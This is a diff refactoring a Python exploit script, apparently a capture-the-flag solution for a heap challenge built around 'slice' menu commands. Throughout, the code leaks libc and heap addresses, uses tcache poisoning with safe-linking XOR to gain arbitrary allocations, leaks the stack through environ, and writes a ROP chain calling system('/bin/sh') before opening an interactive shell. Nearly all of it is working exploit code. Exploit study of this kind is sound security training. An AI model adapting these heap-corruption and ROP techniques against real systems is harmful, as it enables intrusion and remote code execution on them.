@@ -78,7 +78,7 @@ def get_right_slice(r):
 
     return leak
 
-def leak_libc(r):
+def leak_libc_and_heap(r):
     fake_slice1 = p16(0x1000) + b"palle"
     create_slice(r, 1, b"a" * (0x0e) + fake_slice1, 0x15)
 
@@ -103,57 +103,74 @@ def leak_libc(r):
 
     return libc_leak - 0x219ce0, heap_base
 
-def main():
-    r = conn()
-    
-    libc_base, heap_base = leak_libc(r)
-    
+def leak_stack(r, libc_base, heap_base):
     fake_slice1 = heap_base + 0x2b0
     chunk3 = heap_base + 0x2f0
     chunk5 = heap_base + 0x360
     future_arbitrary_alloc = heap_base + 0x510
     target_allocation = 0x221200 - 0x30 + libc_base
+
     payload = b"a" * (chunk3 - fake_slice1 - 0x8 - 2)
     payload += p64(0x31)
     payload += p64((chunk3 >> 12) ^ target_allocation)
     payload = payload.ljust(chunk5 - fake_slice1 - 0x8 - 2, b"A")
     payload += p64(0x41)
     payload += p64((chunk5 >> 12) ^ future_arbitrary_alloc)
+
     edit_favorite_slice(r, payload, 0x1000 - 1)
-            
+
     create_slice(r, 2, b"a" * 4, 0x25)
     fake_slice2 = p16(0x20) + b"palle"
     create_slice(r, 3, b"a" * (0x1e) + fake_slice2, 0x25)
     eat_slice(r, 1)
     eat_slice(r, 7)
-            
+
     leak = get_right_slice(r)
-    
-    environ = u64(leak[0x0e: 0x16])
-    
+
+    return u64(leak[0x0e: 0x16])
+
+def write_rop(r, heap_base, environ, libc_base):
     create_slice(r, 4, b"a" * 4, 0x55)
     create_slice(r, 5, b"a" * 4, 0x55)
-    
+
     eat_slice(r, 4)
     eat_slice(r, 5)
-    
+
     create_slice(r, 4, b"a" * 4, 0x35)
-    
+
     chunk5 = heap_base + 0x520
     stack_allocation = environ - 0x128
-    payload = b"a" * 0x6 + p64(0x61) + p64((chunk5 >> 12) ^ stack_allocation)
-    
+
+    payload = b"a" * 0x6 + p64(0x61) + p64(
+        (chunk5 >> 12) ^ stack_allocation
+    )
+
     create_slice(r, 5, payload, 0x35)
     create_slice(r, 6, b"a" * 4, 0x55)
-    
-    rop = b"a" * 0x6 + p64(POP_RDI + libc_base) + p64(0x1d8698 + libc_base) + p64(RET + libc_base) + p64(0x50d60 + libc_base)
+
+    rop = (
+        b"a" * 0x6
+        + p64(POP_RDI + libc_base)
+        + p64(0x1d8698 + libc_base)
+        + p64(RET + libc_base)
+        + p64(0x50d60 + libc_base)
+    )
+
     create_slice(r, 7, rop, 0x55)
-    
+
     r.recvuntil(b"> ")
     r.sendline(b"8")
     
+def main():
+    r = conn()
+
+    libc_base, heap_base = leak_libc_and_heap(r)
+
+    environ = leak_stack(r, libc_base, heap_base)
+    write_rop(r, heap_base, environ, libc_base)
+
     r.recvuntil(b"Bye! :D\n")
     r.interactive()
-
+    
 if __name__ == "__main__":
     main()
